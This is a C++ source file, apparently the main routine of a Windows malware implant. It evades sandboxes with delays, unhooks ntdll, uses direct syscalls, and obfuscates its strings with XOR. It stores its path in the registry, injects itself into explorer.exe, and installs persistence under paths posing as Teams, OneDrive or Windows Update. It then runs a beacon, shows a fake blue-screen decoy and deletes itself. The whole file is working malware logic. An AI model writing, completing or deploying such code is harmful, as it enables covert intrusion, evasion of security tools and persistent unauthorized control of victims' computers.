#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>

namespace {
    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });

        // "explorer.exe"
        if (sPath.find(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31")) != std::wstring::npos) return true;
        // "svchost.exe"
        if (sPath.find(utils::DecryptW(L"\x29\x2c\x39\x32\x35\x29\x2e\x54\x31\x2c\x31")) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });

        // Basic check for common persist substrings
        if (sPath.find(L"\\microsoft\\teams\\") != std::wstring::npos) return true;
        if (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos) return true;
        if (sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) return true;

        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    // Sandbox/Behavioral delay
    Sleep(10000 + (GetTickCount() % 15000));

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (IsSystemProcess()) {
        // Foothold instance (running inside explorer.exe or svchost.exe)
        LOG_INFO("Foothold active. Installing stealth persistence...");

        // Delay persistence install to stay quiet
        Sleep(45000 + (GetTickCount() % 60000));

        std::wstring dropperPath = L"";
        HKEY hKey;
        // "Software\\Microsoft\\Windows"
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x03\x35\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x33\x39\x28\x35\x29\x35\x3c\x20\x0e\x0e\x07\x33\x34\x3e\x35\x23\x29").c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buf[MAX_PATH];
            DWORD sz = sizeof(buf);
            // "UpdatePath"
            if (RegQueryValueExW(hKey, utils::DecryptW(L"\x0f\x2a\x3e\x3b\x2e\x3f\x0a\x3b\x2e\x32").c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                dropperPath = buf;
            }
            RegCloseKey(hKey);
        }

        persistence::establishPersistence(dropperPath);

        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        return 0;
    }

    if (IsRunningFromPersistLocation()) {
        // Persisted instance (running after reboot)
        LOG_INFO("Persisted instance running.");

        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        return 0;
    }

    // Dropper instance (first run)
    LOG_INFO("Dropper started. Relocating to explorer.exe...");

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hKey;
    // "Software\\Microsoft\\Windows"
    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x03\x35\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x33\x39\x28\x35\x29\x35\x3c\x20\x0e\x0e\x07\x33\x34\x3e\x35\x23\x29").c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        // "UpdatePath"
        RegSetValueExW(hKey, utils::DecryptW(L"\x0f\x2a\x3e\x3b\x2e\x3f\x0a\x3b\x2e\x32").c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Relocation successful. Cleaning up.");
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }
    }

    // If injection failed, try user-level persistence directly (last resort)
    LOG_WARN("Relocation failed. Attempting direct persistence.");
    persistence::establishPersistence();
    decoy::ShowBSOD();

    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
